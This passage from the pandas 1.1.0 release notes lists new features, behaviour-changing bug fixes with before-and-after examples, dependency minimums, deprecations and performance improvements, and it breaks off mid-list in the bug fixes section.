method of ``PyTables`` (:issue:`32682`).\n- :meth:`Series.plot` and :meth:`DataFrame.plot` now accepts ``xlabel`` and ``ylabel`` parameters to present labels on x and y axis (:issue:`9093`).\n- Made :class:`.Rolling` and :class:`.Expanding` iterable\u00ef\u00bc\u0088:issue:`11704`)\n- Made ``option_context`` a :class:`contextlib.ContextDecorator`, which allows it to be used as a decorator over an entire function (:issue:`34253`).\n- :meth:`DataFrame.to_csv` and :meth:`Series.to_csv` now accept an ``errors`` argument (:issue:`22610`)\n- :meth:`.DataFrameGroupBy.groupby.transform` now allows ``func`` to be ``pad``, ``backfill`` and ``cumcount`` (:issue:`31269`).\n- :func:`read_json` now accepts an ``nrows`` parameter. (:issue:`33916`).\n- :meth:`DataFrame.hist`, :meth:`Series.hist`, :meth:`core.groupby.DataFrameGroupBy.hist`, and :meth:`core.groupby.SeriesGroupBy.hist` have gained the ``legend`` argument. Set to True to show a legend in the histogram. (:issue:`6279`)\n- :func:`concat` and :meth:`~DataFrame.append` now preserve extension dtypes, for example\n  combining a nullable integer column with a numpy integer column will no longer\n  result in object dtype but preserve the integer dtype (:issue:`33607`, :issue:`34339`, :issue:`34095`).\n- :func:`read_gbq` now allows to disable progress bar (:issue:`33360`).\n- :func:`read_gbq` now supports the ``max_results`` kwarg from ``pandas-gbq`` (:issue:`34639`).\n- :meth:`DataFrame.cov` and :meth:`Series.cov` now support a new parameter ``ddof`` to support delta degrees of freedom as in the corresponding numpy methods (:issue:`34611`).\n- :meth:`DataFrame.to_html` and :meth:`DataFrame.to_string`'s ``col_space`` parameter now accepts a list or dict to change only some specific columns' width (:issue:`28917`).\n- :meth:`DataFrame.to_excel` can now also write OpenOffice spreadsheet (.ods) files (:issue:`27222`)\n- :meth:`~Series.explode` now accepts ``ignore_index`` to reset the index, similar to :meth:`pd.concat` or :meth:`DataFrame.sort_values` (:issue:`34932`).\n- :meth:`DataFrame.to_markdown` and :meth:`Series.to_markdown` now accept ``index`` argument as an alias for tabulate's ``showindex`` (:issue:`32667`)\n- :meth:`read_csv` now accepts string values like \"0\", \"0.0\", \"1\", \"1.0\" as convertible to the nullable Boolean dtype (:issue:`34859`)\n- :class:`.ExponentialMovingWindow` now supports a ``times`` argument that allows ``mean`` to be calculated with observations spaced by the timestamps in ``times`` (:issue:`34839`)\n- :meth:`DataFrame.agg` and :meth:`Series.agg` now accept named aggregation for renaming the output columns/indexes. (:issue:`26513`)\n- ``compute.use_numba`` now exists as a configuration option that utilizes the numba engine when available (:issue:`33966`, :issue:`35374`)\n- :meth:`Series.plot` now supports asymmetric error bars. Previously, if :meth:`Series.plot` received a \"2xN\" array with error values for ``yerr`` and/or ``xerr``, the left/lower values (first row) were mirrored, while the right/upper values (second row) were ignored. Now, the first row represents the left/lower error values and the second row the right/upper error values. (:issue:`9536`)\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_110.notable_bug_fixes:\n\nNotable bug fixes\n~~~~~~~~~~~~~~~~~\n\nThese are bug fixes that might have notable behavior changes.\n\n``MultiIndex.get_indexer`` interprets ``method`` argument correctly\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nThis restores the behavior of :meth:`MultiIndex.get_indexer` with ``method='backfill'`` or ``method='pad'`` to the behavior before pandas 0.23.0. In particular, MultiIndexes are treated as a list of tuples and padding or backfilling is done with respect to the ordering of these lists of tuples (:issue:`29896`).\n\nAs an example of this, given:\n\n.. ipython:: python\n\n        df = pd.DataFrame({\n            'a': [0, 0, 0, 0],\n            'b': [0, 2, 3, 4],\n            'c': ['A', 'B', 'C', 'D'],\n        }).set_index(['a', 'b'])\n        mi_2 = pd.MultiIndex.from_product([[0], [-1, 0, 1, 3, 4, 5]])\n\nThe differences in reindexing ``df`` with ``mi_2`` and using ``method='backfill'`` can be seen here:\n\n*pandas >= 0.23, < 1.1.0*:\n\n.. code-block:: ipython\n\n    In [1]: df.reindex(mi_2, method='backfill')\n    Out[1]:\n          c\n    0 -1  A\n       0  A\n       1  D\n       3  A\n       4  A\n       5  C\n\n*pandas <0.23, >= 1.1.0*\n\n.. ipython:: python\n\n        df.reindex(mi_2, method='backfill')\n\nAnd the differences in reindexing ``df`` with ``mi_2`` and using ``method='pad'`` can be seen here:\n\n*pandas >= 0.23, < 1.1.0*\n\n.. code-block:: ipython\n\n    In [1]: df.reindex(mi_2, method='pad')\n    Out[1]:\n            c\n    0 -1  NaN\n       0  NaN\n       1    D\n       3  NaN\n       4    A\n       5    C\n\n*pandas < 0.23, >= 1.1.0*\n\n.. ipython:: python\n\n        df.reindex(mi_2, method='pad')\n\n.. _whatsnew_110.notable_bug_fixes.indexing_raises_key_errors:\n\nFailed label-based lookups always raise KeyError\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nLabel lookups ``series[key]``, ``series.loc[key]`` and ``frame.loc[key]``\nused to raise either ``KeyError`` or ``TypeError`` depending on the type of\nkey and type of :class:`Index`.  These now consistently raise ``KeyError`` (:issue:`31867`)\n\n.. ipython:: python\n\n    ser1 = pd.Series(range(3), index=[0, 1, 2])\n    ser2 = pd.Series(range(3), index=pd.date_range(\"2020-02-01\", periods=3))\n\n*Previous behavior*:\n\n.. code-block:: ipython\n\n    In [3]: ser1[1.5]\n    ...\n    TypeError: cannot do label indexing on Int64Index with these indexers [1.5] of type float\n\n    In [4] ser1[\"foo\"]\n    ...\n    KeyError: 'foo'\n\n    In [5]: ser1.loc[1.5]\n    ...\n    TypeError: cannot do label indexing on Int64Index with these indexers [1.5] of type float\n\n    In [6]: ser1.loc[\"foo\"]\n    ...\n    KeyError: 'foo'\n\n    In [7]: ser2.loc[1]\n    ...\n    TypeError: cannot do label indexing on DatetimeIndex with these indexers [1] of type int\n\n    In [8]: ser2.loc[pd.Timestamp(0)]\n    ...\n    KeyError: Timestamp('1970-01-01 00:00:00')\n\n*New behavior*:\n\n.. code-block:: ipython\n\n    In [3]: ser1[1.5]\n    ...\n    KeyError: 1.5\n\n    In [4] ser1[\"foo\"]\n    ...\n    KeyError: 'foo'\n\n    In [5]: ser1.loc[1.5]\n    ...\n    KeyError: 1.5\n\n    In [6]: ser1.loc[\"foo\"]\n    ...\n    KeyError: 'foo'\n\n    In [7]: ser2.loc[1]\n    ...\n    KeyError: 1\n\n    In [8]: ser2.loc[pd.Timestamp(0)]\n    ...\n    KeyError: Timestamp('1970-01-01 00:00:00')\n\n\nSimilarly, :meth:`DataFrame.at` and :meth:`Series.at` will raise a ``TypeError`` instead of a ``ValueError`` if an incompatible key is passed, and ``KeyError`` if a missing key is passed, matching the behavior of ``.loc[]`` (:issue:`31722`)\n\n.. _whatsnew_110.notable_bug_fixes.indexing_int_multiindex_raises_key_errors:\n\nFailed Integer Lookups on MultiIndex Raise KeyError\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\nIndexing with integers with a :class:`MultiIndex` that has an integer-dtype\nfirst level incorrectly failed to raise ``KeyError`` when one or more of\nthose integer keys is not present in the first level of the index (:issue:`33539`)\n\n.. ipython:: python\n\n    idx = pd.Index(range(4))\n    dti = pd.date_range(\"2000-01-03\", periods=3)\n    mi = pd.MultiIndex.from_product([idx, dti])\n    ser = pd.Series(range(len(mi)), index=mi)\n\n*Previous behavior*:\n\n.. code-block:: ipython\n\n    In [5]: ser[[5]]\n    Out[5]: Series([], dtype: int64)\n\n*New behavior*:\n\n.. code-block:: ipython\n\n    In [5]: ser[[5]]\n    ...\n    KeyError: '[5] not in index'\n\n:meth:`DataFrame.merge` preserves right frame's row order\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n:meth:`DataFrame.merge` now preserves the right frame's row order when executing a right merge (:issue:`27453`)\n\n.. ipython:: python\n\n    left_df = pd.DataFrame({'animal': ['dog', 'pig'],\n                           'max_speed': [40, 11]})\n    right_df = pd.DataFrame({'animal': ['quetzal', 'pig'],\n                            'max_speed': [80, 11]})\n    left_df\n    right_df\n\n*Previous behavior*:\n\n.. code-block:: python\n\n    >>> left_df.merge(right_df, on=['animal', 'max_speed'], how=\"right\")\n        animal  max_speed\n    0      pig         11\n    1  quetzal         80\n\n*New behavior*:\n\n.. ipython:: python\n\n    left_df.merge(right_df, on=['animal', 'max_speed'], how=\"right\")\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_110.notable_bug_fixes.assignment_to_multiple_columns:\n\nAssignment to multiple columns of a DataFrame when some columns do not exist\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nAssignment to multiple columns of a :class:`DataFrame` when some of the columns do not exist would previously assign the values to the last column. Now, new columns will be constructed with the right values. (:issue:`13658`)\n\n.. ipython:: python\n\n   df = pd.DataFrame({'a': [0, 1, 2], 'b': [3, 4, 5]})\n   df\n\n*Previous behavior*:\n\n.. code-block:: ipython\n\n   In [3]: df[['a', 'c']] = 1\n   In [4]: df\n   Out[4]:\n      a  b\n   0  1  1\n   1  1  1\n   2  1  1\n\n*New behavior*:\n\n.. ipython:: python\n\n   df[['a', 'c']] = 1\n   df\n\n.. _whatsnew_110.notable_bug_fixes.groupby_consistency:\n\nConsistency across groupby reductions\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nUsing :meth:`DataFrame.groupby` with ``as_index=True`` and the aggregation ``nunique`` would include the grouping column(s) in the columns of the result. Now the grouping column(s) only appear in the index, consistent with other reductions. (:issue:`32579`)\n\n.. ipython:: python\n\n   df = pd.DataFrame({\"a\": [\"x\", \"x\", \"y\", \"y\"], \"b\": [1, 1, 2, 3]})\n   df\n\n*Previous behavior*:\n\n.. code-block:: ipython\n\n   In [3]: df.groupby(\"a\", as_index=True).nunique()\n   Out[4]:\n      a  b\n   a\n   x  1  1\n   y  1  2\n\n*New behavior*:\n\n.. ipython:: python\n\n   df.groupby(\"a\", as_index=True).nunique()\n\nUsing :meth:`DataFrame.groupby` with ``as_index=False`` and the function ``idxmax``, ``idxmin``, ``mad``, ``nunique``, ``sem``, ``skew``, or ``std`` would modify the grouping column. Now the grouping column remains unchanged, consistent with other reductions. (:issue:`21090`, :issue:`10355`)\n\n*Previous behavior*:\n\n.. code-block:: ipython\n\n   In [3]: df.groupby(\"a\", as_index=False).nunique()\n   Out[4]:\n      a  b\n   0  1  1\n   1  1  2\n\n*New behavior*:\n\n.. ipython:: python\n\n   df.groupby(\"a\", as_index=False).nunique()\n\nThe method :meth:`.DataFrameGroupBy.size` would previously ignore ``as_index=False``. Now the grouping columns are returned as columns, making the result a :class:`DataFrame` instead of a :class:`Series`. (:issue:`32599`)\n\n*Previous behavior*:\n\n.. code-block:: ipython\n\n   In [3]: df.groupby(\"a\", as_index=False).size()\n   Out[4]:\n   a\n   x    2\n   y    2\n   dtype: int64\n\n*New behavior*:\n\n.. ipython:: python\n\n   df.groupby(\"a\", as_index=False).size()\n\n.. _whatsnew_110.api_breaking.groupby_results_lost_as_index_false:\n\n:meth:`.DataFrameGroupby.agg` lost results with ``as_index=False`` when relabeling columns\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nPreviously :meth:`.DataFrameGroupby.agg` lost the result columns, when the ``as_index`` option was\nset to ``False`` and the result columns were relabeled. In this case the result values were replaced with\nthe previous index (:issue:`32240`).\n\n.. ipython:: python\n\n   df = pd.DataFrame({\"key\": [\"x\", \"y\", \"z\", \"x\", \"y\", \"z\"],\n                      \"val\": [1.0, 0.8, 2.0, 3.0, 3.6, 0.75]})\n   df\n\n*Previous behavior*:\n\n.. code-block:: ipython\n\n   In [2]: grouped = df.groupby(\"key\", as_index=False)\n   In [3]: result = grouped.agg(min_val=pd.NamedAgg(column=\"val\", aggfunc=\"min\"))\n   In [4]: result\n   Out[4]:\n        min_val\n    0   x\n    1   y\n    2   z\n\n*New behavior*:\n\n.. ipython:: python\n\n   grouped = df.groupby(\"key\", as_index=False)\n   result = grouped.agg(min_val=pd.NamedAgg(column=\"val\", aggfunc=\"min\"))\n   result\n\n\n.. _whatsnew_110.notable_bug_fixes.apply_applymap_first_once:\n\napply and applymap on ``DataFrame`` evaluates first row/column only once\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\n.. ipython:: python\n\n    df = pd.DataFrame({'a': [1, 2], 'b': [3, 6]})\n\n    def func(row):\n        print(row)\n        return row\n\n*Previous behavior*:\n\n.. code-block:: ipython\n\n    In [4]: df.apply(func, axis=1)\n    a    1\n    b    3\n    Name: 0, dtype: int64\n    a    1\n    b    3\n    Name: 0, dtype: int64\n    a    2\n    b    6\n    Name: 1, dtype: int64\n    Out[4]:\n       a  b\n    0  1  3\n    1  2  6\n\n*New behavior*:\n\n.. ipython:: python\n\n    df.apply(func, axis=1)\n\n.. _whatsnew_110.api_breaking:\n\nBackwards incompatible API changes\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\n.. _whatsnew_110.api_breaking.testing.check_freq:\n\nAdded ``check_freq`` argument to ``testing.assert_frame_equal`` and ``testing.assert_series_equal``\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nThe ``check_freq`` argument was added to :func:`testing.assert_frame_equal` and :func:`testing.assert_series_equal` in pandas 1.1.0 and defaults to ``True``. :func:`testing.assert_frame_equal` and :func:`testing.assert_series_equal` now raise ``AssertionError`` if the indexes do not have the same frequency. Before pandas 1.1.0, the index frequency was not checked.\n\n\nIncreased minimum versions for dependencies\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nSome minimum supported versions of dependencies were updated (:issue:`33718`, :issue:`29766`, :issue:`29723`, pytables >= 3.4.3).\nIf installed, we now require:\n\n+-----------------+-----------------+----------+---------+\n| Package         | Minimum Version | Required | Changed |\n+=================+=================+==========+=========+\n| numpy           | 1.15.4          |    X     |    X    |\n+-----------------+-----------------+----------+---------+\n| pytz            | 2015.4          |    X     |         |\n+-----------------+-----------------+----------+---------+\n| python-dateutil | 2.7.3           |    X     |    X    |\n+-----------------+-----------------+----------+---------+\n| bottleneck      | 1.2.1           |          |         |\n+-----------------+-----------------+----------+---------+\n| numexpr         | 2.6.2           |          |         |\n+-----------------+-----------------+----------+---------+\n| pytest (dev)    | 4.0.2           |          |         |\n+-----------------+-----------------+----------+---------+\n\nFor `optional libraries <https://pandas.pydata.org/docs/getting_started/install.html>`_ the general recommendation is to use the latest version.\nThe following table lists the lowest version per library that is currently being tested throughout the development of pandas.\nOptional libraries below the lowest tested version may still work, but are not considered supported.\n\n+-----------------+-----------------+---------+\n| Package         | Minimum Version | Changed |\n+=================+=================+=========+\n| beautifulsoup4  | 4.6.0           |         |\n+-----------------+-----------------+---------+\n| fastparquet     | 0.3.2           |         |\n+-----------------+-----------------+---------+\n| fsspec          | 0.7.4           |         |\n+-----------------+-----------------+---------+\n| gcsfs           | 0.6.0           |    X    |\n+-----------------+-----------------+---------+\n| lxml            | 3.8.0           |         |\n+-----------------+-----------------+---------+\n| matplotlib      | 2.2.2           |         |\n+-----------------+-----------------+---------+\n| numba           | 0.46.0          |         |\n+-----------------+-----------------+---------+\n| openpyxl        | 2.5.7           |         |\n+-----------------+-----------------+---------+\n| pyarrow         | 0.13.0          |         |\n+-----------------+-----------------+---------+\n| pymysql         | 0.7.1           |         |\n+-----------------+-----------------+---------+\n| pytables        | 3.4.3           |    X    |\n+-----------------+-----------------+---------+\n| s3fs            | 0.4.0           |    X    |\n+-----------------+-----------------+---------+\n| scipy           | 1.2.0           |    X    |\n+-----------------+-----------------+---------+\n| sqlalchemy      | 1.1.4           |         |\n+-----------------+-----------------+---------+\n| xarray          | 0.8.2           |         |\n+-----------------+-----------------+---------+\n| xlrd            | 1.1.0           |         |\n+-----------------+-----------------+---------+\n| xlsxwriter      | 0.9.8           |         |\n+-----------------+-----------------+---------+\n| xlwt            | 1.2.0           |         |\n+-----------------+-----------------+---------+\n| pandas-gbq      | 1.2.0           |    X    |\n+-----------------+-----------------+---------+\n\nSee :ref:`install.dependencies` and :ref:`install.optional_dependencies` for more.\n\nDevelopment changes\n^^^^^^^^^^^^^^^^^^^\n\n- The minimum version of Cython is now the most recent bug-fix version (0.29.16) (:issue:`33334`).\n\n\n.. _whatsnew_110.deprecations:\n\nDeprecations\n~~~~~~~~~~~~\n\n- Lookups on a :class:`Series` with a single-item list containing a slice (e.g. ``ser[[slice(0, 4)]]``) are deprecated and will raise in a future version.  Either convert the list to a tuple, or pass the slice directly instead (:issue:`31333`)\n\n- :meth:`DataFrame.mean` and :meth:`DataFrame.median` with ``numeric_only=None`` will include ``datetime64`` and ``datetime64tz`` columns in a future version (:issue:`29941`)\n- Setting values with ``.loc`` using a positional slice is deprecated and will raise in a future version.  Use ``.loc`` with labels or ``.iloc`` with positions instead (:issue:`31840`)\n- :meth:`DataFrame.to_dict` has deprecated accepting short names for ``orient`` and will raise in a future version (:issue:`32515`)\n- :meth:`Categorical.to_dense` is deprecated and will be removed in a future version, use ``np.asarray(cat)`` instead (:issue:`32639`)\n- The ``fastpath`` keyword in the ``SingleBlockManager`` constructor is deprecated and will be removed in a future version (:issue:`33092`)\n- Providing ``suffixes`` as a ``set`` in :func:`pandas.merge` is deprecated. Provide a tuple instead (:issue:`33740`, :issue:`34741`).\n- Indexing a :class:`Series` with a multi-dimensional indexer like ``[:, None]`` to return an ``ndarray`` now raises a ``FutureWarning``. Convert to a NumPy array before indexing instead (:issue:`27837`)\n- :meth:`Index.is_mixed` is deprecated and will be removed in a future version, check ``index.inferred_type`` directly instead (:issue:`32922`)\n\n- Passing any arguments but the first one to :func:`read_html` as\n  positional arguments is deprecated. All other\n  arguments should be given as keyword arguments (:issue:`27573`).\n\n- Passing any arguments but ``path_or_buf`` (the first one) to\n  :func:`read_json` as positional arguments is deprecated. All\n  other arguments should be given as keyword arguments (:issue:`27573`).\n\n- Passing any arguments but the first two to :func:`read_excel` as\n  positional arguments is deprecated. All other\n  arguments should be given as keyword arguments (:issue:`27573`).\n\n- :func:`pandas.api.types.is_categorical` is deprecated and will be removed in a future version; use :func:`pandas.api.types.is_categorical_dtype` instead (:issue:`33385`)\n- :meth:`Index.get_value` is deprecated and will be removed in a future version (:issue:`19728`)\n- :meth:`Series.dt.week` and :meth:`Series.dt.weekofyear` are deprecated and will be removed in a future version, use :meth:`Series.dt.isocalendar().week` instead (:issue:`33595`)\n- :meth:`DatetimeIndex.week` and ``DatetimeIndex.weekofyear`` are deprecated and will be removed in a future version, use ``DatetimeIndex.isocalendar().week`` instead (:issue:`33595`)\n- :meth:`DatetimeArray.week` and ``DatetimeArray.weekofyear`` are deprecated and will be removed in a future version, use ``DatetimeArray.isocalendar().week`` instead (:issue:`33595`)\n- :meth:`DateOffset.__call__` is deprecated and will be removed in a future version, use ``offset + other`` instead (:issue:`34171`)\n- :meth:`~pandas.tseries.offsets.BusinessDay.apply_index` is deprecated and will be removed in a future version. Use ``offset + other`` instead (:issue:`34580`)\n- :meth:`DataFrame.tshift` and :meth:`Series.tshift` are deprecated and will be removed in a future version, use :meth:`DataFrame.shift` and :meth:`Series.shift` instead (:issue:`11631`)\n- Indexing an :class:`Index` object with a float key is deprecated, and will\n  raise an ``IndexError`` in the future. You can manually convert to an integer key\n  instead (:issue:`34191`).\n- The ``squeeze`` keyword in :meth:`~DataFrame.groupby` is deprecated and will be removed in a future version (:issue:`32380`)\n- The ``tz`` keyword in :meth:`Period.to_timestamp` is deprecated and will be removed in a future version; use ``per.to_timestamp(...).tz_localize(tz)`` instead (:issue:`34522`)\n- :meth:`DatetimeIndex.to_perioddelta` is deprecated and will be removed in a future version.  Use ``index - index.to_period(freq).to_timestamp()`` instead (:issue:`34853`)\n- :meth:`DataFrame.melt` accepting a ``value_name`` that already exists is deprecated, and will be removed in a future version (:issue:`34731`)\n- The ``center`` keyword in the :meth:`DataFrame.expanding` function is deprecated and will be removed in a future version (:issue:`20647`)\n\n\n\n.. ---------------------------------------------------------------------------\n\n\n.. _whatsnew_110.performance:\n\nPerformance improvements\n~~~~~~~~~~~~~~~~~~~~~~~~\n\n- Performance improvement in :class:`Timedelta` constructor (:issue:`30543`)\n- Performance improvement in :class:`Timestamp` constructor (:issue:`30543`)\n- Performance improvement in flex arithmetic ops between :class:`DataFrame` and :class:`Series` with ``axis=0`` (:issue:`31296`)\n- Performance improvement in arithmetic ops between :class:`DataFrame` and :class:`Series` with ``axis=1`` (:issue:`33600`)\n- The internal index method :meth:`~Index._shallow_copy` now copies cached attributes over to the new index,\n  avoiding creating these again on the new index. This can speed up many operations that depend on creating copies of\n  existing indexes (:issue:`28584`, :issue:`32640`, :issue:`32669`)\n- Significant performance improvement when creating a :class:`DataFrame` with\n  sparse values from ``scipy.sparse`` matrices using the\n  :meth:`DataFrame.sparse.from_spmatrix` constructor (:issue:`32821`,\n  :issue:`32825`,  :issue:`32826`, :issue:`32856`, :issue:`32858`).\n- Performance improvement for groupby methods :meth:`.Groupby.first`\n  and :meth:`.Groupby.last` (:issue:`34178`)\n- Performance improvement in :func:`factorize` for nullable (integer and Boolean) dtypes (:issue:`33064`).\n- Performance improvement when constructing :class:`Categorical` objects (:issue:`33921`)\n- Fixed performance regression in :func:`pandas.qcut` and :func:`pandas.cut` (:issue:`33921`)\n- Performance improvement in reductions (``sum``, ``prod``, ``min``, ``max``) for nullable (integer and Boolean) dtypes (:issue:`30982`, :issue:`33261`, :issue:`33442`).\n- Performance improvement in arithmetic operations between two :class:`DataFrame` objects (:issue:`32779`)\n- Performance improvement in :class:`.RollingGroupby` (:issue:`34052`)\n- Performance improvement in arithmetic operations (``sub``, ``add``, ``mul``, ``div``) for :class:`MultiIndex` (:issue:`34297`)\n- Performance improvement in ``DataFrame[bool_indexer]`` when ``bool_indexer`` is a ``list`` (:issue:`33924`)\n- Significant performance improvement of :meth:`io.formats.style.Styler.render` with styles added with various ways such as :meth:`io.formats.style.Styler.apply`, :meth:`io.formats.style.Styler.applymap` or :meth:`io.formats.style.Styler.bar` (:issue:`19917`)\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_110.bug_fixes:\n\nBug fixes\n~~~~~~~~~\n\n\nCategorical\n^^^^^^^^^^^\n\n- Passing an invalid ``fill_value`` to :meth:`Categorical.take` raises a ``ValueError`` instead of ``TypeError`` (:issue:`33660`)\n- Combining a :class:`Categorical` with integer categories and which contains missing values with a float dtype column in operations such as :func:`concat` or :meth:`~DataFrame.append` will now result in a float column instead of an object dtype column (:issue:`33607`)\n- Bug where :func:`merge` was unable to join on non-unique categorical indices (:issue:`28189`)\n- Bug when passing categorical data to :class:`Index` constructor along with ``dtype=object`` incorrectly returning a :class:`CategoricalIndex` instead of object-dtype :class:`Index` (:issue:`32167`)\n- Bug where :class:`Categorical` comparison operator ``__ne__`` would incorrectly evaluate to ``False`` when either element was missing (:issue:`32276`)\n- :meth:`Categorical.fillna` now accepts :class:`Categorical` ``other`` argument (:issue:`32420`)\n- Repr of :class:`Categorical` was not distinguishing between ``int`` and ``str`` (:issue:`33676`)\n\nDatetimelike\n^^^^^^^^^^^^\n\n- Passing an integer dtype other than ``int64`` to ``np.array(period_index, dtype=...)`` will now raise ``TypeError`` instead of incorrectly using ``int64`` (:issue:`32255`)\n- :meth:`Series.to_timestamp` now raises a ``TypeError`` if the axis is not a :class:`PeriodIndex`. Previously an ``AttributeError`` was raised (:issue:`33327`)\n- :meth:`Series.to_period` now raises a ``TypeError`` if the axis is not a :class:`DatetimeIndex`. Previously an ``AttributeError`` was raised (:issue:`33327`)\n- :class:`Period` no longer accepts tuples for the ``freq`` argument (:issue:`34658`)\n- Bug in :class:`Timestamp` where constructing a :class:`Timestamp` from ambiguous epoch time and calling constructor again changed the :meth:`Timestamp.value` property (:issue:`24329`)\n- :meth:`DatetimeArray.searchsorted`, :meth:`TimedeltaArray.searchsorted`, :meth:`PeriodArray.searchsorted` not recognizing non-pandas scalars and incorrectly raising ``ValueError`` instead of ``TypeError`` (:issue:`30950`)\n- Bug in :class:`Timestamp` where constructing :class:`Timestamp` with dateutil timezone less than 128 nanoseconds before daylight saving time switch from winter to summer would result in nonexistent time (:issue:`31043`)\n- Bug in :meth:`Period.to_timestamp`, :meth:`Period.start_time` with microsecond frequency returning a timestamp one nanosecond earlier than the correct time (:issue:`31475`)\n- :class:`Timestamp` raised a confusing error message when year, month or day is missing (:issue:`31200`)\n- Bug in :class:`DatetimeIndex` constructor incorrectly accepting ``bool``-dtype inputs (:issue:`32668`)\n- Bug in :meth:`DatetimeIndex.searchsorted` not accepting a ``list`` or :class:`Series` as its argument (:issue:`32762`)\n- Bug where :meth:`PeriodIndex` raised when passed a :class:`Series` of strings (:issue:`26109`)\n- Bug in :class:`Timestamp` arithmetic when adding or subtracting an ``np.ndarray`` with ``timedelta64`` dtype (:issue:`33296`)\n- Bug in :meth:`DatetimeIndex.to_period` not inferring the frequency when called with no arguments (:issue:`33358`)\n- Bug in :meth:`DatetimeIndex.tz_localize` incorrectly retaining ``freq`` in some cases where the original ``freq`` is no longer valid (:issue:`30511`)\n- Bug in :meth:`DatetimeIndex.intersection` losing ``freq`` and timezone in some cases (:issue:`33604`)\n- Bug in :meth:`DatetimeIndex.get_indexer` where incorrect output would be returned for mixed datetime-like targets (:issue:`33741`)\n- Bug in :class:`DatetimeIndex` addition and subtraction with some types of :class:`DateOffset` objects incorrectly retaining an invalid ``freq`` attribute (:issue:`33779`)\n- Bug in :class:`DatetimeIndex` where setting the ``freq`` attribute on an index could silently change the ``freq`` attribute on another index viewing the same data (:issue:`33552`)\n- :meth:`DataFrame.min` and :meth:`DataFrame.max` were not returning consistent results with :meth:`Series.min` and :meth:`Series.max` when called on objects initialized with empty :func:`pd.to_datetime`\n- Bug in :meth:`DatetimeIndex.intersection` and :meth:`TimedeltaIndex.intersection` with results not having the correct ``name`` attribute (:issue:`33904`)\n- Bug in :meth:`DatetimeArray.__setitem__`, :meth:`TimedeltaArray.__setitem__`, :meth:`PeriodArray.__setitem__` incorrectly allowing values with ``int64`` dtype to be silently cast (:issue:`33717`)\n- Bug in subtracting :class:`TimedeltaIndex` from :class:`Period` incorrectly raising ``TypeError`` in some cases where it should succeed and ``IncompatibleFrequency`` in some cases where it should raise ``TypeError`` (:issue:`33883`)\n- Bug in constructing a :class:`Series` or :class:`Index` from a read-only NumPy array with non-ns\n  resolution which converted to object dtype instead of coercing to ``datetime64[ns]``\n  dtype when within the timestamp bounds (:issue:`34843`).\n- The ``freq`` keyword in :class:`Period`, :func:`date_range`, :func:`period_range`, :func:`pd.tseries.frequencies.to_offset` no longer allows tuples, pass as string instead (:issue:`34703`)\n- Bug in :meth:`DataFrame.append` when appending a :class:`Series` containing a scalar tz-aware :class:`Timestamp` to an empty :class:`DataFrame` resulted in an object column instead of ``datetime64[ns, tz]`` dtype (:issue:`35038`)\n- ``OutOfBoundsDatetime`` issues an improved error message when timestamp is out of implementation bounds. (:issue:`32967`)\n- Bug in :meth:`AbstractHolidayCalendar.holidays` when no rules were defined (:issue:`31415`)\n- Bug in :class:`Tick` comparisons raising ``TypeError`` when comparing against timedelta-like objects (:issue:`34088`)\n- Bug in :class:`Tick` multiplication raising ``TypeError`` when multiplying by a float (:issue:`34486`)\n\nTimedelta\n^^^^^^^^^\n\n- Bug in constructing a :class:`Timedelta` with a high precision integer that would round the :class:`Timedelta` components (:issue:`31354`)\n- Bug in dividing ``np.nan`` or ``None`` by :class:`Timedelta` incorrectly returning ``NaT`` (:issue:`31869`)\n- :class:`Timedelta` now understands ``\u00c2\u00b5s`` as an identifier for microsecond (:issue:`32899`)\n- :class:`Timedelta` string representation now includes nanoseconds, when nanoseconds are non-zero (:issue:`9309`)\n- Bug in comparing a :class:`Timedelta` object against an ``np.ndarray`` with ``timedelta64`` dtype incorrectly viewing all entries as unequal (:issue:`33441`)\n- Bug in :func:`timedelta_range` that produced an extra point on a edge case (:issue:`30353`, :issue:`33498`)\n- Bug in :meth:`DataFrame.resample` that produced an extra point on a edge case (:issue:`30353`, :issue:`13022`, :issue:`33498`)\n- Bug in :meth:`DataFrame.resample` that ignored the ``loffset`` argument when dealing with timedelta (:issue:`7687`, :issue:`33498`)\n- Bug in :class:`Timedelta` and :func:`pandas.to_timedelta` that ignored the ``unit`` argument for string input (:issue:`12136`)\n\nTimezones\n^^^^^^^^^\n\n- Bug in :func:`to_datetime` with ``infer_datetime_format=True`` where timezone names (e.g. ``UTC``) would not be parsed correctly (:issue:`33133`)\n\n\nNumeric\n^^^^^^^\n- Bug in :meth:`DataFrame.floordiv` with ``axis=0`` not treating division-by-zero like :meth:`Series.floordiv` (:issue:`31271`)\n- Bug in :func:`to_numeric` with string argument ``\"uint64\"`` and ``errors=\"coerce\"`` silently fails (:issue:`32394`)\n- Bug in :func:`to_numeric` with ``downcast=\"unsigned\"`` fails for empty data (:issue:`32493`)\n- Bug in :meth:`DataFrame.mean` with ``numeric_only=False`` and either ``datetime64`` dtype or ``PeriodDtype`` column incorrectly raising ``TypeError`` (:issue:`32426`)\n- Bug in :meth:`DataFrame.count` with ``level=\"foo\"`` and index level ``\"foo\"`` containing NaNs causes segmentation fault (:issue:`21824`)\n- Bug in :meth:`DataFrame.diff` with ``axis=1`` returning incorrect results with mixed dtypes 